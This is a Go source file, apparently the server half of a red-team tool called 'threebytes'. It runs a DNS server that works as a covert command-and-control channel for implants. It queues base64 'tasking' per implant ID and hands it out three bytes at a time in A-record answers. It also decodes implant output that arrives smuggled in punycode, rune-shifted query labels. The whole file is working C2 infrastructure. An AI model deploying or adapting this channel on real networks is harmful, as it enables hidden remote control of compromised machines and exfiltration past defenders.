package main

/*
 * server.go
 * Server side of threebytes
 * By J. Stuart McMurray
 * Created 20181107
 * Last Modified 20181107
 */

import (
	"bytes"
	"encoding/base64"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"sync"

	lru "github.com/hashicorp/golang-lru"
	"golang.org/x/net/dns/dnsmessage"
	"golang.org/x/net/idna"
)

const (
	/* taskingDomain holds the domain used for tasking */
	taskingDomain = ".tasking."
	buflen        = 4096
	cachesize     = 10240
	ttl           = 1800
)

var (
	/* Buffer pool */
	pool = sync.Pool{New: func() interface{} {
		return make([]byte, buflen)
	}}
	/* Seen cache */
	cache *lru.Cache
	/* Output writer */
	olog = log.New(os.Stdout, "", log.LstdFlags)
	/* Tasking */
	tcache *lru.Cache
)

func init() {
	var err error
	if cache, err = lru.New(cachesize); nil != err {
		panic(err)
	}
	if tcache, err = lru.New(cachesize); nil != err {
		panic(err)
	}
}

/* cachedAnswer holds a cached answer to a query */
type cachedAnswer struct {
	sync.Mutex
	rr *dnsmessage.Resource
}

/* cachedTasking holds a cached tasking queue */
type cachedTasking struct {
	sync.Mutex
	b *bytes.Buffer
}

/* handle handles a received packet */
func handle(
	pc net.PacketConn,
	buf []byte,
	addr net.Addr,
	offset uint,
	firstByte byte,
) {
	/* Unroll the query */
	var m dnsmessage.Message
	if err := m.Unpack(buf); nil != err {
		log.Printf("[%v] Bad packet: %v", addr, err)
		return
	}

	/* Make sure it's sent back */
	m.Header.Response = true
	go func() {
		b := pool.Get().([]byte)
		defer pool.Put(b)
		p, err := m.AppendPack(b[:0])
		if nil != err {
			log.Printf("Unable to pack message: %v", err)
			return
		}
		if _, err := pc.WriteTo(p, addr); nil != err {
			log.Printf("[%v] Unable to send reply: %v", addr, err)
		}
	}()

	/* Make sure we only have one question for a A record */
	if 1 != len(m.Questions) {
		log.Printf("[%v] Got %v questions", addr, len(m.Questions))
		return
	}

	/* Grab the question */
	q := m.Questions[0].Name.String()
	if 0 == len(q) {
		return
	}
	if dnsmessage.TypeA != m.Questions[0].Type ||
		dnsmessage.ClassINET != m.Questions[0].Class {
		if dnsmessage.TypeAAAA == m.Questions[0].Type {
			/* Too many to care about */
			return
		}
		log.Printf(
			"[%v] Invalid Type/Class %v %v",
			q,
			m.Questions[0].Type,
			m.Questions[0].Class,
		)
		return
	}

	/* If it's to the tasking domain, use it as tasking */
	if strings.HasSuffix(q, taskingDomain) {
		handleTasking(strings.TrimSuffix(q, taskingDomain))
		return
	}

	/* If we've already seen this query, return the cached answer */
	cache.ContainsOrAdd(q, &cachedAnswer{})
	cv, ok := cache.Get(q)
	if !ok {
		log.Printf("Too much response cache usage")
		return
	}
	ca := cv.(*cachedAnswer)
	ca.Lock()
	defer ca.Unlock()
	if nil != ca.rr {
		m.Answers = append(m.Answers, *ca.rr)
		return
	}

	/* Break query into parts */
	parts := strings.SplitN(q, ".", 4)
	if 4 != len(parts) {
		log.Printf("[%v] Bad format", q)
		return
	}

	var (
		payload = parts[0]
		implid  = parts[1]
	)

	/* Output */
	if strings.HasPrefix(payload, "xn--") {
		handleOutput(implid, payload, offset)
		return
	}

	/* Get the input buffer if we have one */
	var abuf [4]byte
	abuf[0] = firstByte
	v, ok := tcache.Get(implid)
	if !ok {
		return
	}
	ct := v.(*cachedTasking)

	/* Grab a few bytes of tasking */
	ct.Lock()
	defer ct.Unlock()
	_, err := ct.b.Read(abuf[1:4])
	if nil != err && io.EOF != err {
		panic(err)
	}
	if io.EOF == err {
		return
	}

	/* Send it back and cache it for later */
	ca.rr = &dnsmessage.Resource{
		Header: dnsmessage.ResourceHeader{
			Name:  m.Questions[0].Name,
			Type:  m.Questions[0].Type,
			Class: m.Questions[0].Class,
			TTL:   ttl,
		},
		Body: &dnsmessage.AResource{A: abuf},
	}
	m.Answers = append(m.Answers, *ca.rr)
	log.Printf("[TX:%v] Answer: %q", implid, string(abuf[1:]))
}

/* handleOutput processes an output payload */
func handleOutput(id, payload string, offset uint) {
	/* Decode payload */
	s, err := idna.ToUnicode(payload)
	if nil != err {
		log.Printf("[%v] Punycode decode error: %v", payload, err)
		return
	}
	rs := []rune(s)
	/* Unshift it */
	for i, r := range rs {
		rs[i] = r - rune(offset)
	}
	/* Log it */
	olog.Printf("[RX:%v] %q", id, string(rs))

	return
}

/* handleTasking appends the tasking to the tasking buffer */
func handleTasking(t string) {
	/* Get the implant ID and tasking */
	parts := strings.SplitN(t, ".", 2)
	if 2 != len(parts) {
		log.Printf("Bad tasking query: %q", t)
		return
	}
	d, err := base64.RawURLEncoding.DecodeString(parts[1])
	if nil != err {
		log.Printf("Bad tasking %q: %v", t, err)
		return
	}

	/* Make sure we have a tasking buffer */
	tcache.ContainsOrAdd(parts[0], &cachedTasking{b: new(bytes.Buffer)})
	v, ok := tcache.Get(parts[0])
	if !ok {
		log.Printf("Too much tasking cache usage")
		return
	}
	ct := v.(*cachedTasking)
	ct.Lock()
	defer ct.Unlock()

	/* Add the tasking */
	if _, err := ct.b.Write(d); nil != err {
		log.Printf("[%v] Unable to write tasking: %v", parts[0], err)
		return
	}
	log.Printf("[%v] Tasking now %q", parts[0], ct.b.String())
}
